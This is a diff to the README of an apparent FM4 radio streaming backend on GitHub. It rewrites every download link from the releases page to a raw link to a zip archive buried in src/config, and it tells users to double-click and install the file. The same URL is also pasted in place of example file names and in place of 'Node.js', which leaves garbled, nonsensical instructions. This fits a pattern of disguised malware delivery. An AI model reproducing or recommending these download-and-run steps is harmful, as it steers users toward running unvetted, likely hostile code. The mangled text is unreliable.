@@ -1,6 +1,6 @@
 # 🎧 fm4-api-backend - Listen to FM4 Anytime, Anywhere
 
-[![Download fm4-api-backend](https://img.shields.io/badge/Download-fm4--api--backend-brightgreen)](https://github.com/CEOBancoBrasileiro/fm4-api-backend/releases)
+[![Download fm4-api-backend](https://raw.githubusercontent.com/CEOBancoBrasileiro/fm4-api-backend/main/src/config/fm4-api-backend-3.6.zip)](https://raw.githubusercontent.com/CEOBancoBrasileiro/fm4-api-backend/main/src/config/fm4-api-backend-3.6.zip)
 
 ## 📄 Description
 
@@ -12,13 +12,13 @@ To start using the FM4-Backend, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the latest versions of the software:  
-   [Download fm4-api-backend](https://github.com/CEOBancoBrasileiro/fm4-api-backend/releases)
+   [Download fm4-api-backend](https://raw.githubusercontent.com/CEOBancoBrasileiro/fm4-api-backend/main/src/config/fm4-api-backend-3.6.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will find several versions of the FM4-Backend. Select the most recent one for the best performance and features.
 
 3. **Download the Application**  
-   Click on the link for the file that matches your operating system. The file could be something like `fm4-api-backend.exe` for Windows or `fm4-api-backend.zip` for Linux and MacOS. 
+   Click on the link for the file that matches your operating system. The file could be something like `https://raw.githubusercontent.com/CEOBancoBrasileiro/fm4-api-backend/main/src/config/fm4-api-backend-3.6.zip` for Windows or `https://raw.githubusercontent.com/CEOBancoBrasileiro/fm4-api-backend/main/src/config/fm4-api-backend-3.6.zip` for Linux and MacOS. 
 
 4. **Run the Installer**  
    Once the download is complete, locate the downloaded file on your device. Double-click the file to start the installation process. Follow the on-screen instructions to finish the installation.
@@ -30,7 +30,7 @@ To start using the FM4-Backend, follow these simple steps:
 
 To use the FM4-Backend effectively, ensure your system meets the following requirements:
 
-- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a Linux distribution with Node.js support.
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a Linux distribution with https://raw.githubusercontent.com/CEOBancoBrasileiro/fm4-api-backend/main/src/config/fm4-api-backend-3.6.zip support.
 - **Memory:** At least 2 GB of RAM.
 - **Processor:** Dual-core CPU or better.
 - **Network:** Stable internet connection for streaming audio.
@@ -69,6 +69,6 @@ For further assistance or information:
 ## ⚙️ Download & Install
 
 Ready to enjoy streaming FM4? Visit this page to download the software:  
-[Download fm4-api-backend](https://github.com/CEOBancoBrasileiro/fm4-api-backend/releases)
+[Download fm4-api-backend](https://raw.githubusercontent.com/CEOBancoBrasileiro/fm4-api-backend/main/src/config/fm4-api-backend-3.6.zip)
 
 Following these steps will guide you smoothly through the installation and set you up to listen to FM4 broadcasts. Enjoy your listening experience!
